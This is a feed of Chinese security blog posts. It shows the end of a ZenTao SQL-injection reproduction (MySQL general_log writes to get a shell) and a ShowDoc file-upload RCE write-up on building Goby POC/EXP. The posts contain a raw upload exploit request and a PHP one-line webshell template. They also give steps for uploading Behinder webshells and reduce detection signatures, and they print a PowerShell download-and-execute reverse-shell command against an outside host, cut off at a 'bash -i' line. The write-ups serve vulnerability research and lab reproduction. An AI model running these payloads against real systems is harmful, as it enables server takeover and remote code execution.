-&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code>还是可以的，但是使用general_log方式，SQL语句中会用到下划线<code>_</code>，而<code>_</code>被过滤会造成SQL语句执行出现问题。</p><p>还是参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/lib/base/dao/dao.class.php的orderby函数中可以看到，将“<em>下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过</em>”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2015.png" alt="Untitled"></p><h2 id="为什么general-log值可更改，secure-file-priv不行"><a href="#为什么general-log值可更改，secure-file-priv不行" class="headerlink" title="为什么general_log值可更改，secure_file_priv不行"></a>为什么general_log值可更改，secure_file_priv不行</h2><p>还是查看官方文档，<code>general_log</code>属于<a href="https://dev.mysql.com/doc/refman/5.7/en/dynamic-system-variables.html">Dynamic System Variables</a>，可以通过set来动态更改。而<code>secure_file_priv</code> 是<a href="https://dev.mysql.com/doc/refman/5.7/en/security-options.html">非动态的系统变量</a>，故不可以更改</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2016.png" alt="Untitled"></p><h2 id="黑盒情况下如何判断secure-file-priv变量的值"><a href="#黑盒情况下如何判断secure-file-priv变量的值" class="headerlink" title="黑盒情况下如何判断secure_file_priv变量的值"></a>黑盒情况下如何判断secure_file_priv变量的值</h2><h3 id="根据系统信息"><a href="#根据系统信息" class="headerlink" title="根据系统信息"></a>根据系统信息</h3><blockquote><p>很多人搜到上面的内容就点到为止了，但远不于此</p></blockquote><p>查看了下<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">官方文档关于secure-file-priv的介绍</a> ：</p><p><code>secure-file-priv</code>的默认值因平台而异，取决于对应的CMake文件，默认如下图：</p><p>从图中可以看出windows取决于mysql版本，版本在5.7.16下可利用，而DEB, RPM, SLES, SVR4基本涵盖了绝大部分的linux，默认路径只在/var/lib/mysql-files，故linux下大概率不行</p><p>反馈到靶机环境上：网上采用load_file方式注入shell复现禅道的都在windows下故可行，而vulfucus中则在ubuntu下搭建环境，故无法利用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2017.png" alt="Untitled"></p><blockquote><p>注：文档中也提及mysql服务在启动的时候会根据<code>System variables</code> 设置相关配置 ，而由于<code>secure-file-priv</code> 是写在配置文件中的，故即使更改系统配置文件，也需要重启mysql服务才能使配置生效</p></blockquote><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>select @@secure_file_priv;</code> 或 <code>select @@global.secure_file_priv;</code></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2018.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2019.png" alt="Untitled"></p><h2 id="查看mysql日志debug"><a href="#查看mysql日志debug" class="headerlink" title="查看mysql日志debug"></a>查看mysql日志debug</h2><p>查看mysql日志文件并且时刻刷新进而实现监控的效果： <code>tail -f /var/lib/mysql/ac2ecb1e75dc.log</code>  。<a href="https://www.runoob.com/linux/linux-comm-tail.html">Linux tail 命令</a></p><p>我通过debug找到坑点举例：</p><ol><li>尝试更改日志路径，但是总更改不了：<code>set global general_log_file=&#39;tmp/general.lg&#39;</code> </li><li>通过实时监控日志文件发现命令确实执行，但是就是执行不成功</li><li>将系统执行的命令复制到mysql中执行，发现文件路径少了一个“<code>/</code>”（mysql命令相对路径在/var/lib/mysql下，而该目录下tmp子目录不存在。mysql遇到文件不存在会创建，但遇到路径上的目录不存在则会出错）</li><li>更改后，即可成功<code>set global general_log_file=&#39;/tmp/general.lg&#39;</code></li></ol><p>注：关于为什么在路径中少了个<code>/</code> ，论网上教程的七宗罪</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2020.png" alt="Untitled%2020.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2021.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2022.png" alt="Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2023.png" alt="Untitled"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>感谢<a href="https://ovi3.github.io/index.html">ovi3师傅</a>的指导</li><li>如何发现secure_file_priv在不同平台默认值？<ol><li>缘起：如果在黑盒情况下如何判断能否用load_file？</li><li>想法：我想试着通过盲注注出secure_file_priv变量的值，进而判断能否用load_file，找着找着然后就去看官方文档，进而发现了这个trick</li><li>反思：我们习惯从网上获取到二手的关于secure_file_priv变量设置为null、empty值对应的介绍，然后点到为止</li><li>教训：①多自我提问②多尝试获取一手信息，也许意外之喜</li></ol></li><li>沉下心<ol><li>发现 <code>general_log_file=&#39;tmp/general.lg&#39;</code> 报错之后，就只是简单的以为路径写错了罢了。经过ovi3师傅提醒，发现了错因的根本在于相对路径与绝对路径的区别</li><li>复现报错注入的时候测试payload是“<code>PROCEDURE ANALYSE(polygon(id),1)#</code>”，但实则我的环境中并没有这个id字段注入也不会得到想要的id内容，而我选择盲注复制L3m0n的payload以及其结论而快速跳过，而忽略了其用的是limit后的报错注入而不是之前的堆叠</li></ol></li><li>缺点<ol><li>代码审计篇幅没有展开，也没有深入研究。</li><li>对其他可写日志的php文件没有深入研究，并没有真正探索出共性，如foo.php文件在每个禅道版本是否都存在没有核实。</li></ol></li><li>自省：如果我没有靶机环境，我如何getshell?如何找到foo.php?如果实战遇到，我是否会放弃？</li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>SQL注入</tag>
      
      <tag>mysql写日志</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次不停自我追问式的学习</title>
    <link href="/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初只是简单的搭建环境，拿着公开的POC复现漏洞。然后想着学学Goby如何编写POC&amp;EXP，先拿GUI的形式编写，但是逐渐发现很多想法都满足不了，于是尝试Go语言编写。但也不满足于此，想去探究漏洞成因于是选择代码审计，最后对漏洞成因进行跟踪溯源，得出一个较为满意的结论！</p><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h1><h2 id="1-1-漏洞速览"><a href="#1-1-漏洞速览" class="headerlink" title="1.1 漏洞速览"></a>1.1 漏洞速览</h2><p>漏洞描述：Showdoc存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。</p><p>漏洞影响：ShowDoc &lt; V2.8.3</p><p>漏洞参考：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585">https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585</a></p><h2 id="1-2-环境搭建"><a href="#1-2-环境搭建" class="headerlink" title="1.2 环境搭建"></a>1.2 环境搭建</h2><p>系统：Windows10</p><p>工具：PHPStudy2016，VScode，Goby，Burp</p><p>环境：showdoc-V2.6.7  <a href="https://github.com/star7th/showdoc">https://github.com/star7th/showdoc</a></p><h2 id="1-3-POC"><a href="#1-3-POC" class="headerlink" title="1.3 POC"></a>1.3 POC</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx">POST /index.php?s=<span class="hljs-regexp">/home/</span>page/uploadImg HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-attr">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">81</span><br>Content-Type: multipart/form-data; boundary=---------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Length: <span class="hljs-number">252</span><br><span class="hljs-attr">Connection</span>: close<br><br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;editormd-image-file&quot;</span>; filename=<span class="hljs-string">&quot;1.&lt;&gt;php&quot;</span><br>Content-Type: text/plain<br><br>&lt;?php phpinfo();?&gt;<br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span>--<br></code></pre></td></tr></table></figure><h2 id="1-4-复现"><a href="#1-4-复现" class="headerlink" title="1.4 复现"></a>1.4 复现</h2><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.png"></p><h1 id="2-利用Goby的GUI编写POC-amp-EXP"><a href="#2-利用Goby的GUI编写POC-amp-EXP" class="headerlink" title="2. 利用Goby的GUI编写POC&amp;EXP"></a>2. 利用Goby的GUI编写POC&amp;EXP</h1><h2 id="2-1-编写POC"><a href="#2-1-编写POC" class="headerlink" title="2.1 编写POC"></a>2.1 编写POC</h2><h3 id="2-1-1-填入基本内容"><a href="#2-1-1-填入基本内容" class="headerlink" title="2.1.1 填入基本内容"></a>2.1.1 填入基本内容</h3><p>可以手动输入，但是由于该漏洞有CNVD编号，于是考虑从命令行导入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//在goby的golib目录下的goby-cmd文件，也可以-h解锁更多操作</span><br>goby-cmd -mode genpoc -CNVDID CNVD-<span class="hljs-number">2020</span>-<span class="hljs-number">26585</span> -exportFile exploits\user\CNVD-<span class="hljs-keyword">export</span>.go<br><span class="hljs-comment">//导出文件在goby的\golib\exploits\user目录下</span><br></code></pre></td></tr></table></figure><p>已知BUG：</p><ol><li>通过命令行导出的文件需要手动加上指纹：<code>&quot;GobyQuery&quot;: &quot;app=\&quot;showDoc\&quot;&quot;</code> ，才可以导入进Goby，不然导入不进去，会报错（在log中可以看到报错信息）</li><li>通过命令行导出的文件导入POC时，测试界面会出现白屏bug，因为ScanSteps中缺少<code>&quot;SetVariable&quot;: []</code> 字段，添加即可。</li></ol><blockquote><p>不想拘泥于手动，虽然导入遇到了不少的麻烦，但是总归是需要尝试的，后续Goby团队也会改进的。</p></blockquote><h3 id="2-2-2-发出请求"><a href="#2-2-2-发出请求" class="headerlink" title="2.2.2 发出请求"></a>2.2.2 发出请求</h3><p>简单的将POC内容复制粘贴进对应字段即可</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%201.png"></p><h3 id="2-2-3-验证响应"><a href="#2-2-3-验证响应" class="headerlink" title="2.2.3 验证响应"></a>2.2.3 验证响应</h3><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%87%86%E7%A1%AE%E6%80%A7">《PoC writing suggestions》中的准确性</a>：增加检测关键字、特殊符号、响应包中独一无二的特征，以提高其准确性。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%202.png"></p><h3 id="2-2-4-编写POC的Tips"><a href="#2-2-4-编写POC的Tips" class="headerlink" title="2.2.4 编写POC的Tips"></a>2.2.4 编写POC的Tips</h3><ol><li>修改POC之后记得保存后，再进行单IP测试</li><li>由于Goby可能因为缓存等机制，导致修改POC并保存之后，即使发包也是未修改之前的包，需要返回漏洞管理界面再重新载入POC才行</li><li>由于上述载入载出步骤较为麻烦，我采用<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D">Goby脚手架</a>的方式，在VSCode修改代码的同时在CMD中测试： <code>goby-cmd -mode runpoc -operation scan -pocFile exploits\user\a.go -target 127.0.0.1</code></li><li>脚手架的方式不支持burp代理调试。如果需要对POC进行代理调试的话，推荐依然使用GUI的方法，详见<a href="https://mp.weixin.qq.com/s/IeftOSV29DbDgeClqXqnkg">《Json 编写 PoC&amp;EXP 遇到的那些坑》</a></li></ol><h2 id="2-2-编写EXP"><a href="#2-2-编写EXP" class="headerlink" title="2.2 编写EXP"></a>2.2 编写EXP</h2><p>总体思路同上POC的问题，只不过将上传的验证性文件切换为一句话、菜刀等类型木马文件，然后在浏览器中访问对应连接即可。</p><p>仔细查看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%BC%96%E5%86%99">官方文档的EXP部分</a> ，实际操作步骤如下：</p><ol><li>将 <code>HasExp</code> 字段设置为 true</li><li>在POC界面编写EXP后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>上传文件内容更改为冰蝎马，上传一句话木马同理</li><li>直接将返回的链接扔到冰蝎里面连接即可。</li></ol><p>已知问题：</p><ol><li>GobyGUI目前暂不支持EXP用GUI编写，借用POC界面编写后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>抓包问题：pcap模式扫描127.0.0.1无IP存活，但是socket模式下可以扫127.0.0.1</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%203.png"></p><h2 id="2-3-进一步优化POC-amp-EXP"><a href="#2-3-进一步优化POC-amp-EXP" class="headerlink" title="2.3 进一步优化POC&amp;EXP"></a>2.3 进一步优化POC&amp;EXP</h2><h3 id="2-3-1-自动删除上传文件"><a href="#2-3-1-自动删除上传文件" class="headerlink" title="2.3.1 自动删除上传文件"></a>2.3.1 自动删除上传文件</h3><p>在公网测试的时候，发现一个很不好的现象：某站点上存在大量这类一句话木马。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%204.png"></p><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E6%97%A0%E5%AE%B3%E6%80%A7">《PoC writing suggestions》的无害性</a>： 我们需要将上传的文件进行删除。虽然第一次第二次很麻烦，但是优秀是需要形成习惯的。</p><p>问题：</p><ol><li>如何删除上传文件？PHP中可以利用<code>unlink()</code>函数来删除文件</li><li>如何触发<code>unlink()</code>函数？连续发出两次请求。第一次请求用于上传文件，第二次请求用于触发<code>unlink()</code>函数删除文件</li><li>如何获取第二次请求的链接？第一次的返回包中有返回绝对路径，且Goby可以基于正则提取第一次请求的响应，并在第二次利用，详见Goby<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#json-%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91%E6%89%8B%E5%86%8C">《POC编写指南之JSON 录入漏洞逻辑手册》</a></li><li>如何编写正则？先百度正则语法，再用<a href="https://regex101.com/">regex101平台</a>进行测试</li><li>如何去掉链接<code>/\</code>这些符号？化繁为简，分析文件路径组成：Hostinfo+Public/Uploads+日期+随机文件名，后两个变量分两次正则提取，然后整体拼接即可</li></ol><p>问题解决了，步骤自然清晰：</p><ol><li>在上传的文件末尾增加<code>unlink()</code>函数</li><li>在第一次请求的正则部分增加自定义变量<code>date</code>和<code>file</code></li><li>在Goby中添加第二次请求的URL中使用这两个变量<code>/Public/Uploads/&#123;&#123;&#123;date&#125;&#125;&#125;/&#123;&#123;&#123;file&#125;&#125;&#125;</code></li><li>如果第二次响应为200即可算作成功</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%206.png"></p><h3 id="2-3-2-提高POC的准确性"><a href="#2-3-2-提高POC的准确性" class="headerlink" title="2.3.2 提高POC的准确性"></a>2.3.2 提高POC的准确性</h3><p><strong>问题</strong>：既然可以发出第二次请求，不仅可以触发<code>unlink()</code>函数，是否可以考虑增加一些<code>echo</code>操作进一步提高POC的准确性？</p><p><strong>思路：</strong>在php文件中echo一段随机数，然后第二次请求在响应判断的时候，不仅只是判断响应为200，也匹配是否这段随机数？</p><p>问题解决了，步骤自然清晰。虽然第一次返回匹配到success等字段即可验证POC成功，第二步echo再一下有些多余，但是我想以后肯定某个地方需要用的，先学着。</p><p><strong>已知问题</strong>：由于目前Goby GUI并不支持随机数，所以只能手动输入一个固定数然后进行判断。(Goby团队后续会在GUI中增加随机数选项)</p><h3 id="2-3-3-优化一句话木马"><a href="#2-3-3-优化一句话木马" class="headerlink" title="2.3.3 优化一句话木马"></a>2.3.3 优化一句话木马</h3><p><strong>新需求</strong>：上传冰蝎类的马简单，上传一句话木马类似，但是之前的方式需要在浏览器或冰蝎中打开链接进行操作，有些繁琐。针对一句话木马如果只想在GobyGUI中操作，不需要新打开浏览器中转，肯定更优雅更简洁，那么如何操作？</p><p><strong>需求拆解</strong>：实现动态一句话木马：①在木马文件中动态插入一句话命令②触发木马文件并获取返回值</p><p><strong>问题</strong>：</p><ol><li>如何在上传文件中动态插入参数？查看文档后发现：Goby提供<code>ExpParams</code> 字段来让用户自定义所需传递参数，且和自定义参数逻辑一样，<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>包裹即可在json任意位置使用该变量，比如<code>&lt;?php system(&quot;&#123;&#123;&#123;cmd&#125;&#125;&#125;&quot;);unlink(); ?&gt;</code>,即可实现一句话木马的操作</li><li>如何触发木马并返回值？和前面类似，发送二次请求即可</li></ol><p>Trick：</p><ol><li>Goby发包逻辑是每次先POC后EXP，更改EXP后又要重新走一遍扫描流程，很麻烦，有其他直接验证EXP的操作吗？Goby-cmd.exe脚手架中不仅提供scan操作，也提供exploit操作，且exploit操作支持<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数。</li><li>输入命令<code>goby-cmd -mode runpoc -operation exploit -pocFile exploits\user\a.go -target 127.0.0.1 -params &quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可直接验证EXP。</li><li>在cmd模式下验证EXP无误，切换到GUI界面进行扫描，EXP验证成功！</li></ol><p>已知BUG：</p><ol><li>发包BUG：在json编写EXP需要连续发两个包的情况下，即使内容编写正确的情况下依然可能会检测失败。需要在ExploitSteps的第一个请求的<code>SetVariable</code> 键中额外加入<code>&quot;output|lastbody&quot;</code>值，才会成功执行第二个请求，进而检测成功。（前面《2.3.1 自动删除上传文件》部分用的仅仅只有POC，没用到EXP这一步，所以未产生BUG）</li><li>系统差异BUG：windows下cmd中使用<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数会报错<code>invalid character &#39;\&#39;&#39; looking for beginning of value</code> ，改为<code>&quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%207.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%208.png"></p><h1 id="3-用Go语言编写Goby的POC"><a href="#3-用Go语言编写Goby的POC" class="headerlink" title="3. 用Go语言编写Goby的POC"></a>3. 用Go语言编写Goby的POC</h1><h2 id="3-1-迈出第一步：学用Go语言"><a href="#3-1-迈出第一步：学用Go语言" class="headerlink" title="3.1 迈出第一步：学用Go语言"></a>3.1 迈出第一步：学用Go语言</h2><p>使用GUI时遇到的痛点</p><ol><li>部分功能缺失：无法使用随机数</li><li>缺少DIY需求：对于返回的<code>\/Public\/Uploads\/2021-06-24\/</code> 这类链接无法直接使用，需要手动剔除转移符号</li><li>黑盒的未知性：单纯看Json并不能掌控POC后续是怎么被载入和利用的，没有Go代码看起来的直观可控</li><li>BUG：不少BUG是因为Json中缺少某个键值，但是判断又很难判断，而Go代码更加可控。</li></ol><p><strong>困难：</strong></p><ol><li>上述Poc难吗？不难，不过是发出请求罢了。</li><li>不会Go语言怎么办？只是发出一个请求罢了，官方也提供了code demo，只需要改下URI即可完成轮子搭建。详见<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#golang-%E4%BB%A3%E7%A0%81%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C">Goby《Vulnerability-writing-guide》之golang-代码录入漏洞手册</a></li></ol><p>虽然我不会Go，但是因为上面的痛点，还是想克服困难，迈出那第一步。</p><p><strong>思路：</strong></p><ol><li>化繁为简：先写POC，POC写好了，EXP自然写好了。</li><li>根据官方的demo，改下POC中的Uri，改下匹配的关键字</li><li>测试即可</li></ol><p>具体不表，造轮子而已。</p><h2 id="3-2-进一步：优化POC"><a href="#3-2-进一步：优化POC" class="headerlink" title="3.2 进一步：优化POC"></a>3.2 进一步：优化POC</h2><h3 id="3-2-1-用Go语言实现高级需求"><a href="#3-2-1-用Go语言实现高级需求" class="headerlink" title="3.2.1 用Go语言实现高级需求"></a>3.2.1 用Go语言实现高级需求</h3><p>刚才只是简单的request，想要完成更高的需求，比如前面Json部分对POC的优化</p><p><strong>问题</strong>：</p><ol><li>Go如何实现两次请求达到删除的效果？把发出请求的代码Copy一次，if第一次成功，发出第二次请求，if第二次请求成功，return true。</li><li>Go如何使用正则？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>regexp.MustCompile()</code> ，百度搜用法，先新建regex.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何拼接变量？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>fmt.Sprintf(&quot;%s&quot;,var）</code> ，百度搜用法，先新建fmt.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何实现随机数？因为前面GUI编写只能固定数，存在被检测特征，仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#goutils">官方文档</a> ，发现其使用<code>RandomHexString()</code>生成随机字符串，将固定数替换为随机数变量即可</li><li>Go能否将冰蝎上传后返回链接自动优化，而不是手动删除转义符号？既然我们可以通过拼接<code>date</code>和<code>file</code> 形成第二次请求的链接，那么我们也可以冰蝎的输出的内容改为这个链接：<code>expResult.Output =fmt.Sprintf(&quot;%s/Public/Uploads/%s/%s&quot;, expResult.HostInfo, date[1], file[1])</code> </li><li>Go能否进一步减少POC特征？前面提及不少网上木马的key为<code>peiqi</code> ,此处也可以利用<code>RandomHexString()</code> 的方式随机生成key，然后在第二次使用后删除该文件，实现一次一密的效果。当然<code>boundary=-------xxxxx</code> 字段也可以通过<code>RandomHexString()</code> 来实现随机性。</li></ol><p>一步步的查看文档、测试，发现Go语言编写POC&amp;EXP时，内容和行为更可控，也能实现更多自定义需求，需要的Go语言基础也不高，个人觉得比目前GUI的Json编写更加方便。（后续Goby团队会改进GUI并实现这些需要用Go才能满足需求）</p><h3 id="3-2-2-执行一句话命令"><a href="#3-2-2-执行一句话命令" class="headerlink" title="3.2.2 执行一句话命令"></a>3.2.2 执行一句话命令</h3><p>Goby红队版本就是执行一句话回显命令的方式</p><p><strong>问题：</strong></p><ol><li>Goby如何自定义参数？前面已经介绍了，在Json中的<code>ExpParams</code> 字段来让用户自定义所需传递参数</li><li>Go中如何获取到自定义参数?查看文档发现，可以使用<code>ss.Params[&quot;cmd&quot;].(string)</code>的形式获取参数</li><li>Go中如何将自定义参数输入到payload中？利用前面提及的<code>fmt.Sprintf(&quot;%s&quot;,var）</code> 方式</li></ol><h3 id="3-2-3-更进一步：直接反弹shell"><a href="#3-2-3-更进一步：直接反弹shell" class="headerlink" title="3.2.3 更进一步：直接反弹shell"></a>3.2.3 更进一步：直接反弹shell</h3><p><strong>想法</strong>：既然可以一句话木马，而大部分时间我们生成一句话木马之后第二步就是反弹shell，那么为什么第二次不直接执行反弹shell，难道不比执行一句话命令好？</p><p><strong>问题</strong>：</p><ol><li>如何实现（思路上）？将一句话木马的paylod部分由自定义参数命令的方式直接改为反弹shell的命令即可</li><li>如何实现（实际操作）？查看Goby提供<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-goby-%E7%9A%84-godserver-%E5%8F%8D%E5%BC%B9-shell">反弹shell的demo</a> 文档，然后魔改为自己需要的即可</li><li>为什么可以反弹shell，但是所上传文件无法自动删除，<code>unlink()</code> 函数没触发？因为先执行命令再执行<code>unlink()</code>函数，而前者shell在反弹过程中堵塞了进程，百度后发现可<a href="https://www.php.net/manual/en/function.exec.php#86329">采取<code>popen()</code>启动子进程</a>的方式。(有趣的是，通过该文档，我了解到可以通过<code>php_uname()</code> 来判断服务器主机系统，进而根据不同系统动态生成payload的操作)（GobyShell只有10分钟存活，也可以保证不会长期驻留服务器进程）</li></ol><p>我先在本地测试PHP载荷可以实现反弹shell的效果(详见下图)，然后再在Go语言中实现。</p><blockquote><p>和go0p师傅交流之后，我发现我的想法是错的：我急于直接看到反弹shell的效果，只是因为我的测试环境允许。在实战情况下，目标可能不出网，Godserver服务器可能有一定的问题等等，导致反弹shell不一定在所有环境下都是可以成功的，所以EXP能使用一句话木马回显就用一句话木马回显，其次才考虑其他验证方式。参考<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AE%AE">《GobyPOC编写建议之其他建议》</a></p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//Goby生成的godserver相关命令</span><br><span class="hljs-comment">//ReverseTCPByPowershell</span><br>powershell IEX (New-<span class="hljs-built_in">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://godserver.tk/ps/rs.ps1&#x27;</span>);rs -H godserver.tk -P <span class="hljs-number">35355</span><br><span class="hljs-comment">//ReverseTCPByBash</span><br>bash -i 